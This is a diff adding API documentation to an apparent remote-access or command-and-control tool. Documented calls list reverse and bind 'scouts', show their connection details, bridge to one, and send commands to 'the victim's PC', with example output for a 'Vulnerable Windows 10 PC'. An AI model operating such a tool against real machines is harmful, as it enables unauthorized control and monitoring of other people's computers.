@@ -423,3 +423,40 @@ print(output) # {'status': 'ok', 'message': 'Successfully renamed scout 0 to Vul
 ```
 
 #### `show(to_show)`
+This command prints and provides information about `"bind"` scouts, `"reverse"` scouts or both (`"scouts"`).
+```py
+output = p.scout.show("scouts")
+print(output) # {'status': 'ok', 'message': '', 'data': {'scout_database': {'0': {'conn_object': <socket.socket fd=1132, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('192.168.1.7', 9999), raddr=('192.168.1.7', 50118)>, 'host': '192.168.1.7', 'port': '50118', 'connection_through': '0.0.0.0:9999', 'name': 'Vulnerable Windows 10 PC', 'connected_at': 'YYYY-MM-DD HH:MM:SS', 'connection_type': 'Reverse'}}}}
+```
+
+
+#### `scout_info(scout_id)`
+This command prints and provides detailed information about a scout.
+```py
+output = p.scout.scout_info("0")
+print(output) # {'status': 'ok', 'message': '', 'data': {'scout_database': {'0': {'conn_object': <socket.socket fd=1132, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('192.168.1.7', 9999), raddr=('192.168.1.7', 50118)>, 'host': '192.168.1.7', 'port': '50118', 'connection_through': '0.0.0.0:9999', 'name': 'Vulnerable Windows 10 PC', 'connected_at': 'YYYY-MM-DD HH:MM:SS', 'connection_type': 'Reverse'}}}}
+```
+
+#### `bridge_scout(scout_id)`
+This command bridges to a selected scout.
+```py
+output = p.scout.bridge_scout("0")
+print(output) # {'status': 'ok', 'message': 'Successfully bridged', 'data': None}
+```
+
+## Direct Commands
+These are commands used to send commands to the deploed scout to manipulate and monitor the victim's PC
+
+#### `send(command)`
+This command sends text to the scout to be run as commands. Send `"help"` to get a list of commands that can be run
+```py
+output = p.direct.send("admin")
+print(output) # {'status': 'ok', 'message': '', 'data': {'scout_output': '[*]Scout is running with admin privileges : False'}}
+```
+
+#### `get_bridged()`
+Returns the ID of the currently bridged scout
+```py
+output = p.direct.get_bridged()
+print(output) # {'status': 'ok', 'message': '', 'data': {'scout_info': {'0': {'host': '192.168.1.7', 'port': '50201', 'connection_through': '0.0.0.0:9999', 'name': 'Vulnerable Windows 10 PC', 'connected_at': 'YYYY-MM-DD HH:MM:SS', 'connection_type': 'Reverse'}}}}
+```
